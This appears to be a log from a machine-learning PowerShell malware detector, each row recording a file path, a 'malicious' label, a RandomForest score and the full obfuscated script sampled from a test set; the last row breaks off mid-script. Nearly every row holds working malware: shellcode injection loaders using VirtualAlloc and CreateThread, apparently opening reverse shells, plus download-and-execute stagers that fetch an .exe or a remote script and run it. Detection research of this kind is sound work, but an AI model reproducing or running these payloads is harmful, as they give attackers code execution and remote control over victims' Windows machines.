2026-07-13 17:04:25,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2739.ps1,custom-ps-ml,UNKNOWN,1c02f21a-8c28-40e7-98dd-838fc7ddb28e,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2969,1479.17," (((\""{45}{15}{29}{48}{39}{22}{8}{18}{40}{2}{32}{50}{44}{23}{25}{7}{43}{16}{33}{47}{20}{11}{42}{27}{6}{13}{3}{49}{5}{14}{36}{35}{24}{37}{9}{26}{38}{31}{4}{30}{46}{12}{0}{10}{34}{41}{17}{1}{28}{19}{21}\""-f 'f,0xff,0',' (7nCsc.Leng',' lpParameter, uint dwCreationFlags, ','0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x5','x68,0x00,0x20,0x00,0x00,0x53,0','f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d','e3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,','4,0x8b,0x50,0x30,0x8b,0x52','public static extern ','53,0x56,0x','x31,0x39,0x32,0x2e,0x31,0x36,0x3',',0x10,0x8b,0x4a,0x3c,0x8',',0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x89,0xff,0xf','0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x',',0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd','llImport(zqrkernel32.','2,0x28,0x0f,0xb7,0x4a,0x','Ci -le','IntPtr CreateThread(IntPtr lpT','nt32()',',0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52','+7nCi), 7nCsc[7nCi], 1)};7nCw::CreateThread(0,0,7nCx,0,0,0);for (;;){Start-sleep 60};','flAllocationType, uint flProtect);[DllImport(zqrkernel32.dllzqr)]','-namespace Win32Functions -passthru;[By','4,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x','te[]];[Byte[]]7nCsc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x6','68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x0a,0x4f,0x75,0xed,0x68,0',',0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0x','th-1);7nCi++) {7nCw::memset([IntPtr](7nCx.ToI','dllzqr)]public static extern In','x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xc',',0x93,0x53,0x53,0x89,0xe7,0x57,0','IntPtr lpThreadId);[DllImport(','26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,','8,0x2e,0x3','x00,0x02,0x60,0x8','5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0x70,0x17,0x00,0x00,0xe8,0x78,0x00,0x00,0x00,0x2f,0x35,0x58,0x30,0x54,0x4b,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0','55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x53,0x53,0x53,0x','xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5','Ptr lpAddress, uint dwSize, uint ','hreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr','0,0x2e,0x39,0x00;7nCsize = 0x1000;if (7nCsc.Length -gt 0x1000){7nCsize = 7nCsc.Length};7nCx=7nCw::VirtualAlloc(0,0x1000,7nCsize,0x40);for (7nCi=0;7n','b,0x4c',',0x0c,0x8b,0x52,0x14,0x8b,0x7',' -Name zqrWin32zqr ','7nCc = dbK[D','d,0x8b,0x07,0x01','0xcf','tPtr VirtualAlloc(Int','1,0xff,0xe0,0x5f,0x5','zqrmsvcrt.dllzqr)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);dbK;7nCw = Add-Type -memberDefinition 7nCc'))  -RePLACe  '7nC',[char]36  -CrePlACe  'zqr',[char]34-CrePlACe  'dbK',[char]39) | &amp; ( $VERbOSEPrEfeReNCE.tostrInG()[1,3]+'x'-Join'')",malicious,TP
2026-07-13 17:04:36,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2740.ps1,custom-ps-ml,UNKNOWN,4734402a-9998-40d0-a1bb-90e43e75b4fd,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2945,1444.73,"&amp;((geT-variable '*MDr*').nAMe[3,11,2]-JoiN'')( ((\""{2}{0}{15}{23}{69}{38}{14}{4}{55}{42}{63}{30}{40}{7}{29}{28}{6}{59}{66}{39}{50}{41}{56}{37}{49}{26}{16}{62}{48}{68}{3}{34}{17}{8}{54}{1}{18}{25}{52}{5}{51}{11}{9}{53}{10}{12}{19}{33}{36}{22}{21}{60}{27}{45}{20}{46}{47}{67}{43}{32}{35}{13}{57}{31}{65}{58}{24}{64}{61}{44}\""-f'lAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(rCakernel32.dllrCa)]public static extern Int','0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8','iIzc = L7p[DllImport(rCakernel32.dllrCa)]public static extern IntPtr Virtua','8b,0x01,0xd','s, IntPtr lpThreadId);[DllImport(rCamsvc','0xe0,0x58,0x5','passthr','mberDefinition iIzc -Name rCaWin32rCa -namespace Wi',',0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b','2,0x00,0x00,0x6',',0x54,0x68,0x4c,0',',0xeb,0x86,0x5d,0x68,0x33,0x3','x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0','x58,0xa4,0x53','eationFlag','Ptr Create','61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7','0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24','b,0x01,0xd0,0x89,0x44,0x24','x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5','c0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,','a,0x05,0x','e0,0xff,0xd5,0x97,0x6','Thread(IntPtr lpThreadAttributes,','75,0xec,0xc3;iIzg = 0x1000;if (iIzz.Length -gt 0x',',0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xf','c,0x3c,0x','8c,0x68,0x02,0x00,','s -','n32Function',',','d5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc','0,0x56,0x6a,0',',0x50,0x50,0x50,0x50,0x40,0x50,','6,0x31,','x00,0x68,0','0x40,0x50,0x68,0xea,0x0f,0xdf,0x','8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0x',' dwCr','0x31,0xd2,0x64,0',' uint src, uint count);L7p;iIzw = Add-Type -me','52,0x30,0x8b,0x52,0','a)]public static extern IntPtr mem','x68,0x00,0x10,0x00,0x0','iIzg = iIzz.Length};iIzx=iIzw::VirtualAlloc(0,0x1000,iIzg,0x40);for (iIzi=0;iIzi -le (iIzz.Length-1);iIzi++) {iIzw::memset([IntPtr](iIzx.ToInt32()+iIzi), iIzz[iIzi], 1)};iIzw::CreateThread(0,0,iIzx,0,0,0);for (;;){Start-sleep 60};','0x26,0x94,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0x','0x68,0xf0,0xb5,0xa2,0x56,0xff,','0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,','2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe','ff,0x31,0xc0,0xa','x8b,0x','f,0x5a,0x8b,0x12','f,','8,0x77,0x73,0x32,0x5f',',','rt.dllrC','x0c,0x8b,0x52,0x14,0x',',0xe5,0xff,0x','0xc6,0x85,0xf6,0x','u;[Byte[]];[Byte[]]iIzz = 0xfc,0xe8,0x89,0x00','68,0x5e,0x15,0x4b,0x','){',',0xe','set(IntPtr dest','1000','8,0x5f,0xff,0xd5,0x01,0xc3,0x29,',',0x00,0x00,0x60,0x89,0xe5,','0xd5,0x8b,0x36,0x6a,0x40,0','3,0x3c,0x49,0x8b,0x34,0x',' uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint')).REpLaCe('L7p',[stRiNG][cHar]39).REpLaCe(([cHar]105+[cHar]73+[cHar]122),'$').REpLaCe('rCa',[stRiNG][cHar]34) )",malicious,TP
2026-07-13 17:04:48,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2762.ps1,custom-ps-ml,UNKNOWN,234e021b-acec-499b-a019-a8db19bef48b,DESKTOP-BAC9DBQ,malicious,0.9932,RandomForest,496,1463.91,"&amp; ( $PSHOmE[21]+$PshomE[34]+'x')( (((\""{39}{10}{23}{21}{38}{4}{33}{22}{27}{3}{12}{18}{16}{34}{25}{8}{37}{0}{14}{2}{26}{36}{9}{5}{7}{15}{35}{1}{11}{32}{19}{20}{17}{28}{30}{13}{31}{29}{6}{24}\"" -f'a','d','onfile.xyz/f/921e','.Download','bC','5','s {','5168c2','t','c','t Sy','22a7bfe6.exe{','F','St','n','63','e({0','eb','il','l','e','.W','en','stem.Net','0}fleeble.exe{0}','ht','1','t)','le.ex','ces','e{0});','art-Pro','0},{0}f','li','}','2318b6','b3','p://','e','(New-Objec'))  -f [chaR]39))",malicious,TP
2026-07-13 17:05:02,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2782.ps1,custom-ps-ml,UNKNOWN,9e6c9f24-94fd-4d9a-8451-94e9254e40a6,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3063,1498.96," ((\""{3}{54}{69}{67}{22}{28}{27}{20}{44}{39}{62}{42}{58}{41}{71}{61}{6}{38}{29}{43}{14}{55}{17}{59}{34}{36}{60}{24}{2}{25}{33}{13}{40}{31}{16}{37}{11}{1}{65}{72}{5}{32}{47}{18}{23}{64}{57}{68}{4}{12}{63}{46}{51}{0}{15}{50}{19}{48}{9}{26}{66}{49}{7}{21}{8}{52}{56}{70}{35}{30}{53}{45}{10}\""-f',0x15,','c,0x2e,0xc2,0x','9,0xb1,0x47,0x83,0xe8,0xfc,0x31,0x78,0x14,0x03,0x78,0xa7,0xc0,0xf7,0xfb,0x2f,0x86,0xf8,0x03,0xaf,0xe7,0x71,0xe6,0x9e,0x27,0xe5,0x62,0xb0,0x97,0x6d,0x26,0x3c,0x53,0x23,0xd3,0xb7,0x11,0xec,0xd4,0x70,0x9f,0xc','YauznW = XWx[DllImport(bokke','0,0x21,0x2e,0xfb,0xf2,0xee,0x84,0x93,0xbe,0x67,0x03,0x63,0xc1,0x5d,0xf3,0xfb,0x3c,0x5e,0x04,0xd5,0xfa,0x0a,0x54,0x4d,0x2b,0x33,0x3f,','0x6f,','ntPtr lp','0xc0,0x3b,0x47,0xbe,0x3b,0x6e,0xdc,0x77,0xa','0x0c,0x81,0x57,0xd9,0x98,0xb5,0',',0x7e,0x12,0xef,0x87,0xdd,0xb4,0xf0,0x3d,0x4b,0x38',' 60};','xa7,0x7e,0xd5,0x87,0xda,0xa4,0x50,0x1c,0x7','0x8d,0xd4,0xe6,0xaa,0x88,0x42,0xa9,0x9a,0x23,0x2c,0xc1,0x',',0xd6,0x09,0x2e,0xe1,0x53,0x47,0xf','Function','0xb9,0x06,0xdd,0x3d,0x53,0xe9,0x88,0x16','0x74,0xc3,0x51,0x4f,0x3d,0xdb,0xb6,0x6a,0xf7,0x50,0x0c,0x00,0x06,0xb1,0x5d,0xe9,0xa5,0','thru;[Byte[]];[By','x64,','c,0xd6,0xbc,0x6c,0x62,','nel','e,0xd1,0x8a,0x77,0x3e,0xd2,0x4a,0x2e,0x54,0xd2,0x22,0x96,','int flAll','0x69,0x44,0xbf,0x3d,0xd7,0x2b,0xc0,0x5e,0xb8,0x94,0x64,0x14,0x5','0xc','a,0xdb,0x81,0x8c,0x2f,0x7d,0x01,0xcf,0x63,0x5d,0x38,0x00,0x76,0x9c',',','t flProtect);[DllImport(bokker','ocationType, uin','port(bokmsvcrt.dllbok)]public static extern IntPtr memset(IntPtr dest, uint src, uint','h};Yau2qXt=Yauw::VirtualAlloc(0,0x1000,Yaug,0x40);for (Yaui=0;Yaui -le (Yauz.Length-1);Yaui++) {Yauw::me','e,0xe7,0x68,0x52,0x21,0x7c,0x33,','0xa1,0xc4,0',',0x7d,0x7d,0x7b,0xcc',',0xd8,0xbf,0xb3,0x22,0x02,0x07,0xd9,0x74,0x2','{Yaug = Yauz.Lengt','4,0xf4,0x5','xfc,0x52,0x18,0xb7,0x39,0x54,0xc3,0xc2,0x33,0','Parameter, uint dwCreationFlags, IntPtr lpThreadId);[DllIm','k)]public static exter','3,0x8a,0x2f,0x49,0x73,0x6','ize, IntPtr','tPtr ',' count);XWx;Yauw = Add-Type -memberDefinition YauznW -Name bokWin32bok -namespace Win32','32.dllbo','Yau2qXt.ToInt32()+Yaui), Yauz[Yaui], 1)};Yauw::CreateThread(0,0,Yau2qXt,0,0,0);for (;;){Start-sleep','0x2a','xb9,0xa0,0x20,0x9e,0x9d,0','0x1f,0xc8','5,0xba,0xda,0x6f,0x11,',',0xcb,0x90,0x90,0xed,0x6a,0x5c,0x0f,0x88,0xa',',0x99,0xe4,0xf6','xc4,0x4c,0x23,0xec,0xb9,0xc7,0x4b,0x12,0xe4,0x20,0xd4,0xed,0xc3,0xb0,0x28,0x38,0x2d,0xc7,0x40,0xf8;','mset([IntPtr](','rnel32.dllbok)]public static','s -pass','Yaug = 0x1000;if (Yauz.','x14,0x77,0x30,0x25,0x15,','CreateThread(IntPtr lpThreadAttributes, uint dwStackS','te[]]Yauz = 0xda','8,0x29,','s, I','n In','de,0x43,0x41,0x4e,0x56,0xa5,0x31,0x3e,0x38,0x7a,0xf1,0xee,0xf8,','4,0xc0,0','f8,0x7d,0xe3,0x9','0x6','Address, uint dwSize, u','0x88,0xc',' extern IntPtr VirtualAlloc(IntPtr lp','Length -gt 0x1000)',' lpStartAddres','5,0x8b,0x71,0x48,0xd1,0xd4,0x95,0x4f,0x36,')).REpLAcE('Yau',[sTriNg][ChAR]36).REpLAcE('XWx',[sTriNg][ChAR]39).REpLAcE(([ChAR]98+[ChAR]111+[ChAR]107),[sTriNg][ChAR]34)|.( $Env:comSPec[4,24,25]-JoiN'')",malicious,TP
2026-07-13 17:05:12,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2816.ps1,custom-ps-ml,UNKNOWN,d05ba3b1-6675-46f7-be44-39936b241e31,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3023,1481.02," (((\""{48}{2}{59}{44}{63}{72}{71}{23}{17}{7}{70}{19}{22}{47}{26}{8}{65}{33}{13}{38}{37}{16}{69}{60}{57}{35}{46}{55}{54}{34}{21}{42}{30}{52}{28}{58}{29}{36}{20}{45}{66}{4}{14}{56}{9}{53}{5}{15}{40}{3}{51}{64}{62}{10}{18}{24}{1}{31}{27}{68}{32}{61}{50}{6}{11}{39}{25}{49}{67}{12}{43}{41}{0}\""-f'p 60};','0x86,0x67,0x2a,0xb4,0x3e,0x11,0x77,0x4e,0xdf,0xde,0xad,0x2a,0xdf,0x55,0x42,0xca,0x91,0x9d,0','dll0Ff)]public static','x0c,0xdb,0x29','8,0xe0,0xb8,0x7e,0x2b,0x37,0xc3,0xa4,0xbe,0xac,0x63,0x2e,0x18,0x09','91,0x0a','0x80,0x5a,0x3f,0x54,0x19,0xcf,0xc0,0x0',', IntPtr lp','20Ff -namespace Win32F','fe,0x2b,0x1a,0xee,0xa1,0x94,0xbe,0x64,0x4f,0xc0,0xb2,0x26,0x07,0x25,0xff,0xd8,0xd7,0x2','0x6d,0x16,0x4c,0x','d,0xce,0x58,0xa9,0xb3,0x29,0xae,0x76,0x4b,0x1c,0x2e,0x4a,0x','0,0x1000,KbTg,0x40);for (KbTi=0;KbTi -le (KbTz.Length-1);KbTi++) {KbTw::memset([IntPtr](KbTuwQ.ToInt32()+KbTi), KbTz[KbTi], 1)};KbTw::Creat','yte',',0x92,0xe3,0xff,0xda,0x98,0x48,0x8b,0x85,0xbc,0x4f,0x58,0xbe,0xb8,0xc4,0x5f,0x11,0x49,0x9',',0',' 0xda,0xc','tackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags','cc,0x67,0','public static extern I','3,0x4c,0x7b','xed,0xd1,0x1f,0x2c','ntPtr m','eThread(IntPtr lpThreadAttributes, uint dwS','x99,0xb3,0xec,0x87,0x73,0xdc,','0x1000;i','bQ -Name 0FfWin3','0x50,0xa9,0xeb,0xe7,0x5f,0x78,0xbc,0x9f,0x5d,0x5d,0x8a,0x3f,0x9d,0x88,0x8','0x8e,0x68,0xf8,0x90,0x85,','8f,0x6a,0x2d,0xa7,0x7b,0x00','9,0xc9,0','x2f,0xd8,0x45,0x6e,0x7a,0x82,0xc3,0x71,',',0x73,0xfd,0xf6,','ssthru;[B','x69,0x9f,0xb4,0x0a,0x6a,0x8c,0x85,0x0d,0xe8,0xcf,0xd9,0','0x5d,0xab,0x36,0x86,0x9e,0x54,0xc6,0xe7,0x17,',',0xac,0x61,0xb2,0xe9,0x0','e[]]KbTz =','[]];[Byt','9a,0x58,0x44,0xa2,0x1e;KbTg = ','xfa,0x1d,0x30,0x33,0x91,0xdd,0xbd,0xe6,0',';;){Start-slee',',0xef,0x16,0x7d,0xdd,0xbd,0xcf,0x09,0x70,0x52,0x64,0x47,0x49,0xd9,0x36,0x4','eThread(0,0,KbTuwQ,0,0,0);for (','oc(IntPtr lpAddress, uint dwS',',0x18,0x5d','0xb1,0xf7,0x27,0x43,0xb','emset(IntPtr dest, uint src, uint count);ryz;KbTw = Add-Type -memberDefinition KbTeY','KbTeYbQ = ryz[DllImport(0Ffkernel32.','f (KbTz.Length -gt 0x1000){KbTg = KbTz.L','fd,0xa0,0xb1,0x73,0x95,0x14,0xe2,0x27,',',0xc9,0x79,0xe2,0xc3,0xa1,0x7b,0xe5,0x12,0x89,0xf5','x3e,','1,0x88,0xab,0xe5,0xee,0x22,0x24,0x45,0x66,0xed,0xb3,0xaa,0x5d,0x49,0x2b,0x55,0x5e,0xaa,0x65,0x','4b,0x53,0x45,0x0c,0xd8,0x11,0x42,0x23,0','1,0xa7,0x97,0x07,0x97,0x','e,0x7b,0xb5,0x12,0x44,0xe5,0xec,0x','e,0xc0,','0x32,0xda,0x13,0x4a,0x4f,0x53,0x0c,0x',' extern IntPtr VirtualAll','7,0xb1,0x47,0x83,0xc5,0x04,0x31,0x5d,0x14,0x03,0x5d,0xd','0xdb,0x73,0x','bd,0x55,0x9c,0x24,','ize, uint flAllocationType, uint flProtec',',0x03,0x44,0x','unctions -pa',',0x88,0xbb,0xc3,0x2','ength};KbTuwQ=KbTw::VirtualAlloc(','1,0xf6,0x0b','4,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xbb,0xca,0x22,0xa8,0x5','ThreadId);[DllImport(0Ffmsvcrt.dll0Ff)]','(0Ffkernel32.dll0Ff)]public static extern IntPtr Creat','t);[DllImport'))-ReplaCe  'KbT',[CHar]36  -CrePlAcE  '0Ff',[CHar]34 -CrePlAcE'ryz',[CHar]39) | &amp; ( $PsHOmE[4]+$PShoMe[34]+'X')",malicious,TP
2026-07-13 17:05:16,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2822.ps1,custom-ps-ml,UNKNOWN,94387c2f-733c-45eb-86d5-3483fa80e49d,DESKTOP-BAC9DBQ,malicious,0.9924,RandomForest,1414,1521.61,"&amp; ( ([StrInG]$VERbosEPRefEREnCE)[1,3]+'x'-joiN'') ((((\""{28}{74}{103}{40}{67}{12}{14}{17}{8}{89}{60}{55}{0}{81}{77}{47}{94}{27}{88}{49}{65}{38}{51}{39}{82}{87}{84}{97}{59}{32}{3}{93}{73}{4}{5}{43}{34}{52}{42}{75}{30}{26}{90}{57}{58}{13}{61}{83}{99}{31}{7}{48}{91}{95}{56}{79}{11}{25}{70}{22}{98}{96}{92}{19}{23}{9}{71}{2}{66}{72}{18}{85}{6}{44}{62}{45}{78}{80}{50}{29}{54}{100}{33}{36}{101}{86}{37}{1}{63}{68}{46}{76}{35}{102}{41}{16}{69}{24}{64}{15}{53}{10}{21}{20}\"" -f'a/5.','2.168.1.100:40/inde','S;zL9K=ugl-X3ex5fP{c','(ug','ntugl',',zL9u);z','=','r','m.NeT.W','CREDENT','z','Sy','T ','LtWEbP','SYSt','nGth]};','9K','E','%]r~tdug','fAuLTNet','ugl)','L9B-joINugl','Net','WORK','++%','sT',']','4','z','[]](','eQuEsT','L9wC.P','rS.ADD','rI','XY = [','zL9','NG(oMNht','19','0; rv',' ','-O','oRzL','et.We','L9WC.PRO','0;[CHAR','zL9B','MN)))hem','WO','OxY','Trident/','aR',':11.0)','SYsteM.N','IEX (','zL','l','DeNTIALs','e','faU',';zL9Wc.HeadE','l','r','[]]','x.asp','zL9k.Le','7.','4&gt;8Yk','BjeC','o','[zL9I','eM.','ial','}*+OES7h:zm','ge','L9w','bR','%{',' NT 6.1; ','=(',' = [','[CH','0 (Windows','l','ox','e Gec','l;zL9i','://','ik','; ','EBClIENT;zL9u=uglMozi','::D','.','CACHe]::DE','lUser-A','W6','CrE','Tial','kougl','.CREdeN','y;z','9WC.DOwNLOAdST','tp','_-BX','C=NEW')) -rEPlaCe 'zL9',[cHAR]36  -cREPLace  ([cHAR]117+[cHAR]103+[cHAR]108),[cHAR]39 -rEPlaCe 'hem',[cHAR]124  -cREPLace'oMN',[cHAR]34))",malicious,TP
2026-07-13 17:05:21,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2832.ps1,custom-ps-ml,UNKNOWN,c76147bc-7720-429f-bb8d-be8807e9dff6,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3189,1471.36," . ( $PSHOMe[4]+$pShome[30]+'x') ( (((\""{28}{42}{14}{48}{26}{40}{51}{52}{5}{21}{41}{32}{38}{12}{13}{0}{11}{44}{7}{36}{19}{16}{1}{45}{9}{37}{50}{4}{43}{24}{31}{15}{29}{8}{35}{2}{49}{25}{3}{27}{10}{18}{17}{6}{23}{20}{46}{22}{34}{47}{33}{39}{30}\"" -f 'x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,','5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x7','= 0x1000;if (zlPz.Length -gt 0x1000){zlPg = zlPz.Length};zlPx=','Pw::memset([IntPtr](zlPx.ToIn','0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x','Flags, IntPtr lpThreadId);[DllImport(qr','Bytes(zlP1));z',',0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0',',0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0','x26,0x07,0xff,0xd5,0xb','lPx,0,0,0);for (','0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31','x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,','0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0',' flAllocationType, uint flProtect);[DllImport(qrMkernel32.dllqrM)]public static exte','x35,0x1d,0x76,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68',',0xeb,0x86,0x',':ToBase64String([System.Text.Encoding]::Unicode.Get',';;){Start-sleep 60};F9V;zlPe = [System.Convert]:','a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12','Ptr]::Size -e','Mmsvcrt.dllqrM)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);F9VF9V;zlPw = Add-Ty',':SystemRoot + qrMVR0syswow64VR','lP2 = qrM-enc qrM;if([Int','0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff','0;zlPi -le (zlPz.Length-1);zlPi++) {zl','(IntP','t32()+zlPi), zlPz[zlPi], 1)};zlPw::CreateThread(0,0,z','zlP1 = F9VzlPc = F9VF9V[DllImport',',0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58','zlP2 zlPeqrM;}',',0xd5,0x97,0x6a,0x05,0x68,0xbf,0','mespace Win32F','ershellqrM;iex qrM&amp; zlP3 zlP2 zlPeqrM}el','0Win','xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;zlPg ','x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5','8,0x90,0','unctions -passthru;[Byte[]];[Byte[]]zlPz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0','se{;iex qrM&amp; powershell ','tr lpThreadAttributes, ui','pe -memberDefinition zlPc -Name qrMWin32qrM -na','(qrMkernel32.dllqrM)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint','50,0x40,0x50,0x40,',',0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0','3,0x32,0x5f,0x54,0x68,0x4c,0x77,0','q 8){zlP3 = zlPenv','dowsPowerShellVR0v1.0VR0pow','rn IntPtr CreateThread','zlPw::VirtualAlloc(0,0x1000,zlPg,0x40);for (zlPi=','x01,','nt dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint ','dwCreation'))  -rEPlace  ([CHaR]86+[CHaR]82+[CHaR]48),[CHaR]92  -CREPlace'zlP',[CHaR]36  -rEPlace ([CHaR]113+[CHaR]114+[CHaR]77),[CHaR]34-CREPlace ([CHaR]70+[CHaR]57+[CHaR]86),[CHaR]39) )",malicious,TP
2026-07-13 17:05:31,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2846.ps1,custom-ps-ml,UNKNOWN,1bdbbb66-d20a-47b1-b074-fcacd93bc5f1,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2782,1514.29,".((GV '*MDr*').NAME[3,11,2]-JoIN'') (((\""{34}{4}{40}{2}{23}{14}{1}{8}{9}{43}{12}{39}{27}{44}{3}{25}{19}{17}{26}{32}{20}{21}{33}{16}{42}{6}{13}{35}{38}{18}{30}{11}{0}{29}{24}{46}{31}{7}{28}{22}{37}{41}{15}{5}{10}{45}{36}\"" -f'x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf','count);Pri;DyXw = Add-Type -memberDefinition DyXc -Name 75KWin3275K -namespace Win32Functions -passthru;[Byte[]];[','lp','x01,0xd3,0xe3,','lic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,','i), DyXz[DyXi], 1','29,0xc4,0x54,0x50,0x68,0x29,0x80,0x','d5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;DyXg = 0x1000;if (DyXz.Length -gt 0x1','Byte','[]]',')};DyXw::Crea',',0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0','0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x','6b,0x00,0xff,0xd5,0x50,0x50,0x50,',' dest, uint src, uint ','DyXx.ToInt32()+DyX','x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,','4,0x8b,0x01,0xd0,0x89,','6a,0x05,0x68,0xc0,0xa8,0',',0xd3,0x8b,0x0','1,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68',',0x33,0x32,0x00,0x','DyXg = 